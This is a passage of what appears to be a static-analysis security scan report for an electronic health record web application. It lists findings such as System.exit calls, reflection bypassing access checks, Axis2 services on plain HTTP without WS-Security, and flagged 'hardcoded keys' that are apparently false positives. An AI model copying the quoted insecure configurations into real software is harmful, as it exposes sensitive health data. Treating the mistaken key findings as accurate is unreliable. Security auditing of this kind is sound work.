<FilePath>EHR-WEBAPP/jsp/ehr/common/pgErrorPage.jsp</FilePath>
<LineStart>150</LineStart>
<Snippet>&lt;div id="templatemo_content"&gt;
&lt;form name="frmError" action="&lt;%=EHRCommonConstants.EHR_FORM_ACTION%&gt;"&gt;
&lt;input name="fhdn:UserAction" type="hidden" value="" /&gt;
&lt;CNSI:HiddenControl controlName="fhdn:menuId" controlValue="home" /&gt;
&lt;CNSI:HiddenControl controlName="fhdn:ModuleName" controlValue="EHR" /&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>J2EE Bad Practices: JVM Termination</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The call to exit() in main() at CNSIEditorBean.java line 508 shuts down the web application container. A web application should not attempt to shut down its container.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>It is never a good idea for a web application to attempt to shut down the application container. A call to a termination method is probably part of leftover debug code or code imported from a non-J2EE application.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Never call a termination method within a web application. Such method calls in a J2EE application indicates poor software hygiene and should be removed. Regardless of whether there is a perceived threat, it is unlikely that there is a legitimate reason for such code to remain in the application.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. The presence of a call to exit() or halt() in a J2EE application may be an indication of other problems. When you find a call to exit() or halt(), look for other indications that developers were rushed or that a significant body of non-J2EE code has been introduced into the application without proper consideration for the security or quality ramifications.

2. If you are auditing a non-J2EE Java application, the J2EE Bad Practices categories might not apply to your environment. If this is the case, you can use AuditGuide to suppress these issues.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="81B624FD404C80571091035BC7F4F8E3" ruleID="9D479AB5-B986-492C-B1F0-C11F2FD623F7">
                            <Category>J2EE Bad Practices: JVM Termination</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The call to exit() in main() at CNSIEditorBean.java line 508 shuts down the web application container. A web application should not attempt to shut down its container.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIEditorBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIEditorBean.java</FilePath>
<LineStart>508</LineStart>
<Snippet>			System.out.println(bean.getContent());

			System.exit(0);
		}catch(Exception e){
			e.printStackTrace();</Snippet>
<TargetFunction>exit()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="25BA29B39427C613CD9117C65629AB3C" ruleID="9D479AB5-B986-492C-B1F0-C11F2FD623F7">
                            <Category>J2EE Bad Practices: JVM Termination</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The call to exit() in generatePDF() at PDFGeneratorImpl.java line 483 shuts down the web application container. A web application should not attempt to shut down its container.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>PDFGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/PDFGeneratorImpl.java</FilePath>
<LineStart>483</LineStart>
<Snippet>	public void generatePDF(String prvdrTypeLkpcd, String year, int stage) throws FileNotFoundException, DocumentException, IOException  {
		generateNewPDF(prvdrTypeLkpcd, year, stage);
		System.exit(0);
	}
	</Snippet>
<TargetFunction>exit()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Key Management: Hardcoded Encryption Key</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Hardcoded encryption keys can compromise security in a way that cannot be easily remedied.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>It is never a good idea to hardcode an encryption key because it allows all of the project's developers to view the encryption key, and makes fixing the problem extremely difficult. After the code is in production, a software patch is required to change the encryption key. If the account that is protected by the encryption key is compromised, the owners of the system must choose between security and availability.


Example 1: The following code uses a hardcoded encryption key:


...
private static final String encryptionKey = "lakdsljkalkjlksdfkl";
byte[] keyBytes = encryptionKey.getBytes();
SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");
Cipher encryptCipher = Cipher.getInstance("AES");
encryptCipher.init(Cipher.ENCRYPT_MODE, key);
...


Anyone with access to the code has access to the encryption key. After the application has shipped, there is no way to change the encryption key unless the program is patched. An employee with access to this information can use it to break into the system. If attackers had access to the executable for the application, they could extract the encryption key value.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Encryption keys should never be hardcoded and should be obfuscated and managed in an external source. Storing encryption keys in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the encryption key.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="081F95E52514F6EB425A10FDC17D9792" ruleID="3CFCB607-7521-48EA-952D-B36C7C4B6DBC">
                            <Category>Key Management: Hardcoded Encryption Key</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded encryption keys can compromise security in a way that cannot be easily remedied.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>managegraceperiod.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/state/track/managegraceperiod.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>	String l_sLabel = "Manage Grace Period";
	String l_sText = "Grace Period List. Select a row to update a program year's grace period for EP and/or EH.";
	long key = 0;
	long value = 0;
	</Snippet>
<TargetFunction>VariableAccess: key</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CC071DE93C22B23BA7041BAA81F11CE9" ruleID="17B7D071-8066-482B-AC21-63DFE28CEEC1">
                            <Category>Key Management: Hardcoded Encryption Key</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded encryption keys can compromise security in a way that cannot be easily remedied.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>CommonConstants.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CommonConstants.java</FilePath>
<LineStart>836</LineStart>
<Snippet>	 * Holds the Map key constant
	 */
	public static final String KEY = "Key";

	/*</Snippet>
<TargetFunction>FieldAccess: KEY()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Access Specifier Manipulation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The call to method setAccessible() on line 59 changes an access specifier.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>The AccessibleObject API allows the programmer to get around the access control checks provided by Java access specifiers. In particular it enables the programmer to allow a reflected object to bypass Java access controls and in turn change the value of private fields or invoke private methods, behaviors that are normally disallowed.
  </Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Access specifiers should only be changed by a privileged class using arguments that an attacker cannot set. All occurrences should be examined carefully.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="9F57CEB77D670D0AA888B3188B5E520F" ruleID="08C47B0A-C83B-4B1B-8BDD-6BF44F9AE58A">
                            <Category>Access Specifier Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The call to method setAccessible() on line 59 changes an access specifier.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>TagReflectionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/reflection/TagReflectionUtil.java</FilePath>
<LineStart>59</LineStart>
<Snippet>			try {
				Field field = aClass.getDeclaredField(propertyName);
				field.setAccessible(true);
				value = field.get(p_FormBeanObject);
			} catch (NoSuchFieldException pexception) {</Snippet>
<TargetFunction>setAccessible()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Misconfiguration: Insecure Message Security</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Apache Axis 2 is configured to use REST, and REST does not have message security standards.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>If a service relays messages to other services, the messages are exposed to the weakest transport mechanism used between relay points. REST by itself does not include any security mechanisms, so this service relies on the transport layer for message integrity and confidentiality.

The following configuration enables REST:

&lt;axisconfig name="AxisJava2.0"&gt;
...
    &lt;parameter name="disableREST" locked="true"&gt;false&lt;/parameter&gt;
...
&lt;/axisconfig&gt;
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Use the WS-Security module provided with Apache Axis 2 for message security. WS-Security is an extension of SOAP that provides end-to-end message integrity and confidentiality regardless of the transport protocol. WS-Security removes the transport security dependency and places it in the message.

The following configuration disables REST:

&lt;axisconfig name="AxisJava2.0"&gt;
...
    &lt;parameter name="disableREST" locked="true"&gt;true&lt;/parameter&gt;
...
&lt;/axisconfig&gt;
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="92379A31BA9DB795A8341B55F54B506D" ruleID="6796ADDC-FE1B-4957-A460-A61E74FA6108">
                            <Category>Axis 2 Misconfiguration: Insecure Message Security</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Apache Axis 2 is configured to use REST, and REST does not have message security standards.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>axis2.xml</FileName>
<FilePath>XML/axis2.xml</FilePath>
<LineStart>53</LineStart>
<Snippet>
    &lt;!-- Following parameter will completely disable REST handling in both the servlets--&gt;
    &lt;parameter name="disableREST" locked="true"&gt;false&lt;/parameter&gt;

    &lt;!-- This will disable the separate servlet we have for REST handling. --&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Misconfiguration: Insecure Transport Receiver</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The configuration should ensure SSL is required for access to sensitive information.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>If an application handles sensitive information and does not use message-level encryption, then it should only be allowed to communicate over an encrypted transport channel.

</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Ensure that HTTP transport is disabled and enable HTTPS transport instead.

For example, set the name attribute to https as follows:
&lt;transportReceiver name="https" class="org.apache.axis2.transport.http.SimpleHTTPServer"&gt;</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="E3AC1912214211223BE220B7A8110015" ruleID="4438316D-7373-4A67-A097-520BC18F5F3A">
                            <Category>Axis 2 Misconfiguration: Insecure Transport Receiver</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The configuration should ensure SSL is required for access to sensitive information.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>axis2.xml</FileName>
<FilePath>XML/axis2.xml</FilePath>
<LineStart>85</LineStart>
<Snippet>    &lt;!-- ================================================= --&gt;
    &lt;transportReceiver name="http"
                       class="org.apache.axis2.transport.http.SimpleHTTPServer"&gt;
        &lt;parameter name="port" locked="false"&gt;6060&lt;/parameter&gt;
        &lt;!-- Here is the complete list of supported parameters (see example settings further below):</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Misconfiguration: Insecure Transport Sender</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The configuration should ensure SSL is required for access to sensitive information.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>If an application handles sensitive information and does not use message-level encryption, then it should only be allowed to communicate over an encrypted transport channel. The &lt;transportSender&gt; tag should not specify http, because communication with this URL will not be encrypted.

</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Ensure that HTTP transport is disabled and enable HTTPS transport instead.
For example, set the name attribute to https like:
&lt;transportSender name="https" class="org.apache.axis2.transport.http.CommonsHTTPTransportSender"&gt;</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="81B554072E34071563C2D091ED7D2083" ruleID="27010BCB-516C-485C-BBAF-939DB8D8D60B">
                            <Category>Axis 2 Misconfiguration: Insecure Transport Sender</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The configuration should ensure SSL is required for access to sensitive information.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>axis2.xml</FileName>
<FilePath>XML/axis2.xml</FilePath>
<LineStart>158</LineStart>
<Snippet>                     class="org.apache.axis2.transport.local.LocalTransportSender"/&gt;
    &lt;transportSender name="http"
                     class="org.apache.axis2.transport.http.CommonsHTTPTransportSender"&gt;
        &lt;parameter name="PROTOCOL" locked="false"&gt;HTTP/1.1&lt;/parameter&gt;
        &lt;parameter name="Transfer-Encoding" locked="false"&gt;chunked&lt;/parameter&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Service Provider Misconfiguration: Inbound WS-Security Not Enabled</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Service providers that don't require WS-Security might not be able to guarantee message integrity or confidentiality.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>WS-Security is an enhancement to SOAP that provides end-to-end message integrity and confidentiality regardless of the transport protocol. When WS-Security is not used, messages rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security removes the transport security dependency and secures the message itself.

 The absence of an InflowSecurity parameter in the Apache Axis 2 configuration file indicates that inbound message security is not enabled.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Configure the service to use WS-Security for inbound requests.

The configuration should contain an InflowSecurity parameter as shown in the following example:

&lt;service&gt;
...
    &lt;parameter name="InflowSecurity"&gt;
...
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="EF809C46B0F57918CF5F12926A0B438E" ruleID="6068EF40-BAE5-4926-A1C2-D7B04C891DAF">
                            <Category>Axis 2 Service Provider Misconfiguration: Inbound WS-Security Not Enabled</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Service providers that don't require WS-Security might not be able to guarantee message integrity or confidentiality.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>services.xml</FileName>
<FilePath>XML/services.xml</FilePath>
<LineStart>2</LineStart>
<Snippet>&lt;serviceGroup&gt;
 	&lt;service name="ProviderValidationService"&gt;
        &lt;parameter name="ServiceClass" locked="false"&gt;com.ecams.webservices.provider.ProviderValidationService&lt;/parameter&gt;
        &lt;operation name="validatePrvdrBusinessStatusAndTaxId"&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Service Provider Misconfiguration: Outbound WS-Security Not Enabled</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Service providers that don't use WS-Security might not be able to guarantee message integrity or confidentiality.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>WS-Security is an extension of SOAP that provides end-to-end message integrity and confidentiality regardless of the transport protocol. When WS-Security is not used, messages rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security removes the transport security dependency and secures the message itself.

. The absence of an OutflowSecurity parameter in the Apache Axis 2 configuration file indicates that outbound message security is not enabled.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Configure the service to use WS-Security on outbound responses. The configuration should contain an OutflowSecurity parameter as shown in the following example:

&lt;service&gt;
...
    &lt;parameter name="OutflowSecurity"&gt;
...
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="AC64DBF0B8DBEAF13853B051A9C67878" ruleID="1B88A74B-ED15-4843-BE11-35F0846D6EA4">
                            <Category>Axis 2 Service Provider Misconfiguration: Outbound WS-Security Not Enabled</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Service providers that don't use WS-Security might not be able to guarantee message integrity or confidentiality.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>services.xml</FileName>
<FilePath>XML/services.xml</FilePath>
<LineStart>2</LineStart>
<Snippet>&lt;serviceGroup&gt;
 	&lt;service name="ProviderValidationService"&gt;
        &lt;parameter name="ServiceClass" locked="false"&gt;com.ecams.webservices.provider.ProviderValidationService&lt;/parameter&gt;
        &lt;operation name="validatePrvdrBusinessStatusAndTaxId"&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Service Provider Misconfiguration: WS-Security Not Enabled</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Turning off WS-Security makes it hard to guarantee message integrity and confidentiality.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>The Rampart WS-Security module is not enabled. WS-Security is an extension of SOAP that provides end-to-end message integrity and confidentiality regardless of the transport protocol. When WS-Security is not used, messages rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security eliminates the transport security dependency and builds security into the message itself.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Configure the service to use the Rampart WS-Security module. This can be enabled in service provider configuration file by adding &lt;module ref="rampart"/&gt;.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="FCA9BA028907BA70047B8755093F8E2C" ruleID="6A3AB860-716C-484B-9DC6-7716810E9D7C">
                            <Category>Axis 2 Service Provider Misconfiguration: WS-Security Not Enabled</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Turning off WS-Security makes it hard to guarantee message integrity and confidentiality.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>services.xml</FileName>
<FilePath>XML/services.xml</FilePath>
<LineStart>2</LineStart>
<Snippet>&lt;serviceGroup&gt;
 	&lt;service name="ProviderValidationService"&gt;
        &lt;parameter name="ServiceClass" locked="false"&gt;com.ecams.webservices.provider.ProviderValidationService&lt;/parameter&gt;
        &lt;operation name="validatePrvdrBusinessStatusAndTaxId"&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Axis 2 Service Requester Misconfiguration: WS-Security Not Enabled</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Turning off WS-Security makes it hard to guarantee message integrity and confidentiality.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>The Rampart WS-Security module is not enabled. WS-Security is an extension of SOAP that provides end-to-end message integrity and confidentiality regardless of the transport protocol. When WS-Security is not used, message rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security removes the transport security dependency and builds security into the message itself.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Provided the service provider supports it, configure the client to use the Rampart WS-Security module. This can be enabled in client configuration file by adding &lt;module ref="rampart"/&gt;.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="96B6B098016D0FC500ED9FBDF850E7E5" ruleID="5197E3CA-0134-4558-87B8-DE1F99C05517">
                            <Category>Axis 2 Service Requester Misconfiguration: WS-Security Not Enabled</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Turning off WS-Security makes it hard to guarantee message integrity and confidentiality.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>axis2.xml</FileName>
<FilePath>XML/axis2.xml</FilePath>
<LineStart>1</LineStart>
<Snippet>&lt;axisconfig name="AxisJava2.0"&gt;
    &lt;!-- ================================================= --&gt;
    &lt;!-- Parameters --&gt;</Snippet>
<TargetFunction>/axisconfig()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Code Correctness: Byte Array to String Conversion</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The call to String() on line 41 of PDFUtilities.java converts a byte array into a String, which may lead to data loss.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>When data from a byte array is converted into a String, it is unspecified what will happen to any data that is outside of the applicable character set. This can lead to data being lost, or a decrease in the level of security when binary data is needed to ensure proper security measures are followed.

Example 1: The following code converts data into a String in order to create a hash.


  ...
  FileInputStream fis = new FileInputStream(myFile);
  byte[] byteArr = byte[BUFSIZE];
  ...
  int count = fis.read(byteArr);
  ...
  String fileString = new String(byteArr);
  String fileSHA256Hex = DigestUtils.sha256Hex(fileString);
  // use fileSHA256Hex to validate file
  ...


Assuming the size of the file is less than BUFSIZE, this works fine as long as the information in myFile is encoded the same as the default character set, however if it's using a different encoding, or is a binary file, it will lose information. This in turn will cause the resulting SHA hash to be less reliable, and could mean it's far easier to cause collisions, especially if any data outside of the default character set is represented by the same value, such as a question mark.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Generally speaking, a byte array potentially containing noncharacter data should never be converted into a String object as it may break functionality, but in some cases this can cause much larger security concerns. In a lot of cases there is no need to actually convert a byte array into a String, but if there is a specific reason to be able to create a String object from binary data, it must first be encoded in a way such that it will fit into the default character set.

Example 2: The following uses a different variant of the API in Example 1 to prevent any validation problems.


  ...
  FileInputStream fis = new FileInputStream(myFile);
  byte[] byteArr = byte[BUFSIZE];
  ...
  int count = fis.read(byteArr);
  ...
  byte[] fileSHA256 = DigestUtils.sha256(byteArr);
  // use fileSHA256 to validate file, comparing hash byte-by-byte.
  ...


In this case, it is straightforward to rectify, since this API has overloaded variants including one that accepts a byte array, and this could be simplified even further by using another overloaded variant of DigestUtils.sha256() that accepts a FileInputStream object as its argument. Other scenarios may need careful consideration as to whether it's possible that the byte array could contain data outside of the character set, and further refactoring may be required.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="71470170D62ED7BDF0E1590A42C4EFC5" ruleID="993CC475-24A5-4BBD-A008-67045CCA0ACB">
                            <Category>Code Correctness: Byte Array to String Conversion</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The call to String() on line 41 of PDFUtilities.java converts a byte array into a String, which may lead to data loss.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>PDFUtilities.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/common/PDFUtilities.java</FilePath>
<LineStart>41</LineStart>
<Snippet>		l_objFileInputStream.read(byteContent);
		l_objFileInputStream.close();
